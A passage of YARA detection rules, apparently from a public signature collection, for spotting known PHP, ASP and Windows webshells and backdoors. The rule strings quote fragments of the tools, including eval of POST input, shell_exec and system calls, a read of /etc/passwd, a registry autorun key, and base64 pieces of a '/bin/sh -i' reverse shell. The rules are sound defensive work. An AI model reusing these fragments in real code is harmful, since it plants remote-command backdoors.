		$s15 = "<form action=\\\"$SFileName?$urlAdd\\\" method=\\\"POST\\\">" fullword
		$s20 = "elseif ( $cmd==\"downl\" ) { /*<!-- Save the edited file back to a file --> */" fullword

	condition:
		3 of them
}

rule SIGNATURE_BASE_Webshell__PH_Vayv_Phvayv_PH_Vayv_Klasvayv_Asp_Php_2
{
	meta:
		description = "PHP Webshells Github Archive - from files PH Vayv.php, PHVayv.php, PH_Vayv.php, klasvayv.asp.php.txt"
		author = "Florian Roth (Nextron Systems)"
		id = "1575591b-3245-5c3d-b2a4-6def89e77032"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L6851-L6869"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "42959ba1e3c0f7f198f953e98b9df87059999f5526df4338c109828d0a5a518a"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		super_rule = 1
		hash0 = "b51962a1ffa460ec793317571fc2f46042fd13ee"
		hash1 = "408ac9ca3d435c0f78bda370b33e84ba25afc357"
		hash2 = "4003ae289e3ae036755976f8d2407c9381ff5653"
		hash3 = "4f83bc2836601225a115b5ad54496428a507a361"

	strings:
		$s1 = "<font color=\"#000000\">Sil</font></a></font></td>" fullword
		$s5 = "<td width=\"122\" height=\"17\" bgcolor=\"#9F9F9F\">" fullword
		$s6 = "onfocus=\"if (this.value == 'Kullan" fullword
		$s16 = "<img border=\"0\" src=\"http://www.aventgrup.net/arsiv/klasvayv/1.0/2.gif\">"

	condition:
		2 of them
}

rule SIGNATURE_BASE_Webshell__PH_Vayv_Phvayv_PH_Vayv_2
{
	meta:
		description = "PHP Webshells Github Archive - from files PH Vayv.php, PHVayv.php, PH_Vayv.php"
		author = "Florian Roth (Nextron Systems)"
		id = "1575591b-3245-5c3d-b2a4-6def89e77032"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L6893-L6909"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "b2f2b95415bc990adac38eada20cbc793f286d51f2054bc969e9c667f16717f9"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		super_rule = 1
		hash0 = "b51962a1ffa460ec793317571fc2f46042fd13ee"
		hash1 = "408ac9ca3d435c0f78bda370b33e84ba25afc357"
		hash2 = "4003ae289e3ae036755976f8d2407c9381ff5653"

	strings:
		$s4 = "<form method=\"POST\" action=\"<?echo \"PHVayv.php?duzkaydet=$dizin/$duzenle"
		$s12 = "<? if ($ekinci==\".\" or  $ekinci==\"..\") {" fullword
		$s17 = "name=\"duzenx2\" value=\"Klas" fullword

	condition:
		2 of them
}

rule SIGNATURE_BASE_Webshell__Crystalshell_V_1_Erne_Stres_2
{
	meta:
		description = "PHP Webshells Github Archive - from files CrystalShell v.1.php, erne.php, stres.php"
		author = "Florian Roth (Nextron Systems)"
		id = "4e73e42e-b968-5b68-a00d-d2a8a1f3541c"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L6952-L6973"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "a0484a5a71715d6a79c89e20919ab89aaa7e85a18ee502651f1f6b29153847a3"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		super_rule = 1
		hash0 = "335a0851304acedc3f117782b61479bbc0fd655a"
		hash1 = "6eb4ab630bd25bec577b39fb8a657350bf425687"
		hash2 = "03f88f494654f2ad0361fb63e805b6bbfc0c86de"

	strings:
		$s1 = "<input type='submit' value='  open (shill.txt) '>" fullword
		$s4 = "var_dump(curl_exec($ch));" fullword
		$s7 = "if(empty($_POST['Mohajer22'])){" fullword
		$s10 = "$m=$_POST['curl'];" fullword
		$s13 = "$u1p=$_POST['copy'];" fullword
		$s14 = "if(empty(\\$_POST['cmd'])){" fullword
		$s15 = "$string = explode(\"|\",$string);" fullword
		$s16 = "$stream = imap_open(\"/etc/passwd\", \"\", \"\");" fullword

	condition:
		5 of them
}

rule SIGNATURE_BASE_Webshell_GFS_2
{
	meta:
		description = "PHP Webshells Github Archive - from files GFS web-shell ver 3.1.7 - PRiV8.php, Predator.php, GFS_web-shell_ver_3.1.7_-_PRiV8.php"
		author = "Florian Roth (Nextron Systems)"
		id = "bde6cfd8-466f-528a-b1e3-f874aa778010"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L7018-L7034"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "72a3f117cb11e1461b760c47a3de74283640b6e1daa87b24e45210213bb76609"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		super_rule = 1
		hash0 = "c2f1ef6b11aaec255d4dd31efad18a3869a2a42c"
		hash1 = "34f6640985b07009dbd06cd70983451aa4fe9822"
		hash2 = "d25ef72bdae3b3cb0fc0fdd81cfa58b215812a50"

	strings:
		$s0 = "OKTsNCmNsb3NlKFNURE9VVCk7DQpjbG9zZShTVERFUlIpOw==\";" fullword
		$s1 = "lIENPTk47DQpleGl0IDA7DQp9DQp9\";" fullword
		$s2 = "Ow0KIGR1cDIoZmQsIDIpOw0KIGV4ZWNsKCIvYmluL3NoIiwic2ggLWkiLCBOVUxMKTsNCiBjbG9zZShm"

	condition:
		all of them
}

rule SIGNATURE_BASE_Webshell_Generic_PHP_10_2
{
	meta:
		description = "PHP Webshells Github Archive - from files Cyber Shell.php, cybershell.php, Cyber Shell (v 1.0).php, PHPRemoteView.php"
		author = "Florian Roth (Nextron Systems)"
		id = "f52013d6-72ce-544c-a7ef-ae2a2ea87108"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L7056-L7076"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "0bf731edef55cde5d2ad16510fb9f1a240c1a06b535af7e13300fdbea470df74"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		super_rule = 1
		hash0 = "ef7f7c45d26614cea597f2f8e64a85d54630fe38"
		hash1 = "cabf47b96e3b2c46248f075bdbc46197db28a25f"
		hash2 = "9e165d4ed95e0501cd9a90155ac60546eb5b1076"
		hash3 = "7d5b54c7cab6b82fb7d131d7bbb989fd53cb1b57"

	strings:
		$s2 = "$world[\"execute\"] = ($world['execute']=='x') ? 't' : 'T'; " fullword
		$s6 = "$owner[\"write\"] = ($mode & 00200) ? 'w' : '-'; " fullword
		$s11 = "$world[\"execute\"] = ($mode & 00001) ? 'x' : '-'; " fullword
		$s12 = "else if( $mode & 0xA000 ) " fullword
		$s17 = "$s=sprintf(\"%1s\", $type); " fullword
		$s20 = "font-size: 8pt;" fullword

	condition:
		all of them
}

rule SIGNATURE_BASE_Webshell_Generic_PHP_11_2
{
	meta:
		description = "PHP Webshells Github Archive - from files rootshell.php, Rootshell.v.1.0.php, s72 Shell v1.1 Coding.php, s72_Shell_v1.1_Coding.php"
		author = "Florian Roth (Nextron Systems)"
		id = "590c5320-ef85-5522-94fd-4619749f7eb1"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L7077-L7099"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "5a559a26314ce603d6454efb71f1243bf89daed920ca2a495a51b94a4cca0045"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		super_rule = 1
		hash0 = "31a82cbee8dffaf8eb7b73841f3f3e8e9b3e78cf"
		hash1 = "838c7191cb10d5bb0fc7460b4ad0c18c326764c6"
		hash2 = "8dfcd919d8ddc89335307a7b2d5d467b1fd67351"
		hash3 = "80aba3348434c66ac471daab949871ab16c50042"

	strings:
		$s5 = "$filename = $backupstring.\"$filename\";" fullword
		$s6 = "while ($file = readdir($folder)) {" fullword
		$s7 = "if($file != \".\" && $file != \"..\")" fullword
		$s9 = "$backupstring = \"copy_of_\";" fullword
		$s10 = "if( file_exists($file_name))" fullword
		$s13 = "global $file_name, $filename;" fullword
		$s16 = "copy($file,\"$filename\");" fullword
		$s18 = "<td width=\"49%\" height=\"142\">" fullword

	condition:
		all of them
}

rule SIGNATURE_BASE_Webshell__Findsock_Php_Findsock_Shell_Php_Reverse_Shell_2
{
	meta:
		description = "PHP Webshells Github Archive - from files findsock.c, php-findsock-shell.php, php-reverse-shell.php"
		author = "Florian Roth (Nextron Systems)"
		id = "6567c8f1-bd7f-5844-b937-3db2d8eb7408"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L7100-L7114"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "2459f7114482e17f087bda4b638c29e237f2f3cb5a9e41e326ed65fc1834b6be"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		super_rule = 1
		hash0 = "5622c9841d76617bfc3cd4cab1932d8349b7044f"
		hash1 = "4a20f36035bbae8e342aab0418134e750b881d05"
		hash2 = "40dbdc0bdf5218af50741ba011c5286a723fa9bf"

	strings:
		$s1 = "// me at pentestmonkey@pentestmonkey.net" fullword

	condition:
		all of them
}

rule SIGNATURE_BASE_Webshell_Generic_PHP_6_2
{
	meta:
		description = "PHP Webshells Github Archive"
		author = "Florian Roth (Nextron Systems)"
		id = "e61ec617-565a-5b24-82f4-3677ef379a06"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L7115-L7136"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "7b3f2ca3cb9516ddda1b9cac2ca5eb5d9e62e1839dad041f69a3dc7a2a186897"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		super_rule = 1
		hash0 = "1a08f5260c4a2614636dfc108091927799776b13"
		hash1 = "335a0851304acedc3f117782b61479bbc0fd655a"
		hash2 = "ca9fcfb50645dc0712abdf18d613ed2196e66241"
		hash3 = "36d8782d749638fdcaeed540d183dd3c8edc6791"
		hash4 = "03f88f494654f2ad0361fb63e805b6bbfc0c86de"

	strings:
		$s2 = "@eval(stripslashes($_POST['phpcode']));" fullword
		$s5 = "echo shell_exec($com);" fullword
		$s7 = "if($sertype == \"winda\"){" fullword
		$s8 = "function execute($com)" fullword
		$s12 = "echo decode(execute($cmd));" fullword
		$s15 = "echo system($com);" fullword

	condition:
		4 of them
}

rule SIGNATURE_BASE_Unpack_Injectt_2
{
	meta:
		description = "Webshells Auto-generated - file Injectt.exe"
		author = "Florian Roth (Nextron Systems)"
		id = "80dc3086-41a6-5e30-bbf4-463500fe5e33"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L7138-L7151"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "8a5d2158a566c87edc999771e12d42c5"
		logic_hash = "d8e9ed4f2604617bd6410f36ab827affa3cc6729ba996d0d9cd9c8eb0fd96533"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s2 = "%s -Run                              -->To Install And Run The Service"
		$s3 = "%s -Uninstall                        -->To Uninstall The Service"
		$s4 = "(STANDARD_RIGHTS_REQUIRED |SC_MANAGER_CONNECT |SC_MANAGER_CREATE_SERVICE |SC_MAN"

	condition:
		all of them
}

rule SIGNATURE_BASE_Hytop_Devpack_Fso_2
{
	meta:
		description = "Webshells Auto-generated - file fso.asp"
		author = "Florian Roth (Nextron Systems)"
		id = "094eeff9-0da0-5a44-a45c-f8ee57861e7a"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L7152-L7164"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "b37f3cde1a08890bd822a182c3a881f6"
		logic_hash = "9d071c1e2e0725091a2abe24759e6e71d78e29caa76b4fff77c44e3bb381b1a2"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "<!-- PageFSO Below -->"
		$s1 = "theFile.writeLine(\"<script language=\"\"vbscript\"\" runat=server>if request(\"\"\"&cli"

	condition:
		all of them
}

rule SIGNATURE_BASE_Felikspack3___PHP_Shells_Ssh_2
{
	meta:
		description = "Webshells Auto-generated - file ssh.php"
		author = "Florian Roth (Nextron Systems)"
		id = "0b971065-df16-5092-beff-c55608447f19"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L7165-L7176"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "1aa5307790d72941589079989b4f900e"
		logic_hash = "40c5a5d1d714947454f4aa9f7ed09d777cb60c23933201ac8eaf0d49452af8c6"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "eval(gzinflate(str_rot13(base64_decode('"

	condition:
		all of them
}

rule SIGNATURE_BASE_Debug_Bdoor_2
{
	meta:
		description = "Webshells Auto-generated - file BDoor.dll"
		author = "Florian Roth (Nextron Systems)"
		id = "0938efe7-2b6d-5749-af9a-967cca85defb"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L7177-L7189"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "e4e8e31dd44beb9320922c5f49739955"
		logic_hash = "ed8caeb96a6fc48fe23d5db078bbb8ba5aec3c5d4ee382cbc6bc4e01630f1460"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = "\\BDoor\\"
		$s4 = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"

	condition:
		all of them
}

rule SIGNATURE_BASE_Bin_Client_2
{
	meta:
		description = "Webshells Auto-generated - file Client.exe"
		author = "Florian Roth (Nextron Systems)"
		id = "8564d787-5edc-59b0-b1ef-2f33c8a24f82"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L7190-L7204"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "5f91a5b46d155cacf0cc6673a2a5461b"
		logic_hash = "28ce9aa136b5d41bb580e6b5b8580d3ccbb7eeec31007e68241d23c5a0f40d40"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "Recieved respond from server!!"
		$s4 = "packet door client"
		$s5 = "input source port(whatever you want):"
		$s7 = "Packet sent,waiting for reply..."

	condition:
		all of them
}

rule SIGNATURE_BASE_Zxshell2_0_Rar_Folder_Zxshell_2
{
	meta:
		description = "Webshells Auto-generated - file ZXshell.exe"
		author = "Florian Roth (Nextron Systems)"
		id = "621ac87e-b1f8-58d7-9328-54af5ca9b605"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L7205-L7217"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "246ce44502d2f6002d720d350e26c288"
		logic_hash = "72eaf90551144eccb7329e0a0e05bcc955ea2bfdb37aa87e9cae7b5f5a26bea0"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "WPreviewPagesn"
		$s1 = "DA!OLUTELY N"

	condition:
		all of them
}

rule SIGNATURE_BASE_Rkntload_2
{
	meta:
		description = "Webshells Auto-generated - file RkNTLoad.exe"
		author = "Florian Roth (Nextron Systems)"
		id = "fd4b1343-5fa9-5ad8-bee1-6b06b93ddfbe"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L7218-L7236"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "262317c95ced56224f136ba532b8b34f"
		logic_hash = "ab767a7016318633055a85195ca2bab08a8c68222d46018aaf8772ab27a373c4"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = "$Info: This file is packed with the UPX executable packer http://upx.tsx.org $"
		$s2 = "5pur+virtu!"
		$s3 = "ugh spac#n"
		$s4 = "xcEx3WriL4"
		$s5 = "runtime error"
		$s6 = "loseHWait.Sr."
		$s7 = "essageBoxAw"
		$s8 = "$Id: UPX 1.07 Copyright (C) 1996-2001 the UPX Team. All Rights Reserved. $"

	condition:
		all of them
}

rule SIGNATURE_BASE_Binder2_Binder2_2
{
	meta:
		description = "Webshells Auto-generated - file binder2.exe"
		author = "Florian Roth (Nextron Systems)"
		id = "29269dc0-f2e4-56ec-ad64-0dff00e339b7"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L7237-L7253"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "d594e90ad23ae0bc0b65b59189c12f11"
		logic_hash = "fbe56b7d37fc7863fcf55761c0b5b671d661a713ac95f90d65b79eee9a447a9b"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "IsCharAlphaNumericA"
		$s2 = "WideCharToM"
		$s4 = "g 5pur+virtu!"
		$s5 = "\\syslog.en"
		$s6 = "heap7'7oqk?not="
		$s8 = "- Kablto in"

	condition:
		all of them
}

rule SIGNATURE_BASE_Thelast_Orice2_2
{
	meta:
		description = "Webshells Auto-generated - file orice2.php"
		author = "Florian Roth (Nextron Systems)"
		id = "968cef9e-0163-5f4a-91e3-07510f9f4fcd"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L7254-L7266"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "aa63ffb27bde8d03d00dda04421237ae"
		logic_hash = "075f3377a9b90c6c1ba74682415b9c0832a839afe647fa6d3c85d4e987618405"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = " $aa = $_GET['aa'];"
		$s1 = "echo $aa;"

	condition:
		all of them
}

rule SIGNATURE_BASE_FSO_S_Sincap_2
{
	meta:
		description = "Webshells Auto-generated - file sincap.php"
		author = "Florian Roth (Nextron Systems)"
		id = "fcee20a3-e71b-5f69-ac67-8660fd270703"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L7267-L7279"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "dc5c2c2392b84a1529abd92e98e9aa5b"
		logic_hash = "705030e93248f5ea6744f78bd7a1816aaa9772880059286b8d686e05b193d4a0"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "    <font color=\"#E5E5E5\" style=\"font-size: 8pt; font-weight: 700\" face=\"Arial\">"
		$s4 = "<body text=\"#008000\" bgcolor=\"#808080\" topmargin=\"0\" leftmargin=\"0\" rightmargin="

	condition:
		all of them
}

rule SIGNATURE_BASE_Phpshell_2
{
	meta:
		description = "Webshells Auto-generated - file PhpShell.php"
		author = "Florian Roth (Nextron Systems)"
		id = "887264d3-5704-5e38-b0a6-44d529258ea2"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L7280-L7291"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "539baa0d39a9cf3c64d65ee7a8738620"
		logic_hash = "95b3cedac370bf9b06092035a738722f3ec97e6cbafe3d4f742429a865576ad8"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s2 = "href=\"http://www.gimpster.com/wiki/PhpShell\">www.gimpster.com/wiki/PhpShell</a>."

	condition:
		all of them
}

rule SIGNATURE_BASE_Hytop_Devpack_Config_2
{
	meta:
		description = "Webshells Auto-generated - file config.asp"
		author = "Florian Roth (Nextron Systems)"
		id = "da1b8ce1-8b17-53f6-a86b-ad3fe918084e"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L7292-L7305"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "b41d0e64e64a685178a3155195921d61"
		logic_hash = "b2806c30db413bca518943352f233c9d2915356a41eceed5e352b88ee34fbbd3"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "const adminPassword=\""
		$s2 = "const userPassword=\""
		$s3 = "const mVersion="

	condition:
		all of them
}

rule SIGNATURE_BASE_Sendmail_2
{
	meta:
		description = "Webshells Auto-generated - file sendmail.exe"
		author = "Florian Roth (Nextron Systems)"
		id = "dd33c2bb-61bf-57b7-82b9-d864097f7a56"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L7306-L7318"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "75b86f4a21d8adefaf34b3a94629bd17"
		logic_hash = "bcca9a9380d2695bc277afc9fa72c24cb26ac44c6fbcc87113b017cfe190bdab"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s3 = "_NextPyC808"
		$s6 = "Copyright (C) 2000, Diamond Computer Systems Pty. Ltd. (www.diamondcs.com.au)"

	condition:
		all of them
}

rule SIGNATURE_BASE_FSO_S_Zehir4_3
{
	meta:
		description = "Webshells Auto-generated - file zehir4.asp"
		author = "Florian Roth (Nextron Systems)"
		id = "9f1adcd6-b721-54ef-a20f-c3a353629a40"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L7319-L7330"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "5b496a61363d304532bcf52ee21f5d55"
		logic_hash = "6bcfb1ee40403394bf996ecbe1bb17f9afa0c3ba9e1906881b94bbc785b4a510"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s5 = " byMesaj "

	condition:
		all of them
}

rule SIGNATURE_BASE_Hkshell_Hkshell_2
{
	meta:
		description = "Webshells Auto-generated - file hkshell.exe"
		author = "Florian Roth (Nextron Systems)"
		id = "7436cd7c-7027-56dc-bb62-fac0f70c27d8"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L7331-L7344"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "168cab58cee59dc4706b3be988312580"
		logic_hash = "bee4d4c957ede41c771d690d52ac2fd3655238cc1fc106d30fb2721084b38aa1"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = "PrSessKERNELU"
		$s2 = "Cur3ntV7sion"
		$s3 = "Explorer8"

	condition:
		all of them
}

rule SIGNATURE_BASE_Unpack_Tback_2
{
	meta:
		description = "Webshells Auto-generated - file TBack.dll"
		author = "Florian Roth (Nextron Systems)"
		id = "b5f93621-e1e9-5aed-b574-471b4c1f9570"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L7357-L7368"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "a9d1007823bf96fb163ab38726b48464"
		logic_hash = "0fb43766c305f4235cc0987f411fdc3b3674723687f0b63d346429f4a7b5b87f"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s5 = "\\final\\new\\lcc\\public.dll"

	condition:
		all of them
}

rule SIGNATURE_BASE_Darkspy105_2
{
	meta:
		description = "Webshells Auto-generated - file DarkSpy105.exe"
		author = "Florian Roth (Nextron Systems)"
		id = "9d519ccf-fe52-5b82-a39d-c9f86c1089e1"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L7369-L7380"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "f0b85e7bec90dba829a3ede1ab7d8722"
		logic_hash = "0f1c9dba4525f9c30f309500652ed6af647ddf492f483e101fc23c891e15fc85"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s7 = "Sorry,DarkSpy got an unknown exception,please re-run it,thanks!"

	condition:
